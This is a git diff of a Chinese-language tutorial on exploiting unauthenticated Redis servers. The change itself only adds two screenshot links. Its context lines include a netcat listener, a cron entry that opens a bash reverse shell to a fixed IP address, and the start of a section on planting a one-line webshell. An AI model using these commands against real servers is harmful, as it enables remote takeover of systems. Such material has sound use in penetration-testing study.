@@ -144,8 +144,9 @@ nc -lvvp 6666
 #### tips：
 1. 出错时使用`tail -f /var/log/syslog`查看系统日志
 2. 在Ubuntu环境中，crontabs/root的权限不是600（-rw-------）时报错如下`(root) INSECURE MODE (mode 0600 expected) (crontabs/root)`
+![error_600](/assets/Redis未授权/error_600.png)
 3. 在Ubuntu下报错(CRON) info (No MTA installed, discarding output)时，将cron文件改为`* * * * * bash -c 'bash -i>& /dev/tcp/192.168.10.128/6666 0>&1`即可
-
+![error_output](/assets/Redis未授权/error_output.png)
 ### 3、写入webshell
 >利用条件:目标开启了web服务器,并且知道web路径(可以利用phpinfo或者错误暴路径等)，还需要具有读写增删改查权限<br>
 #### step 1.设置存储文件夹的路径、文件名以及一句话木马
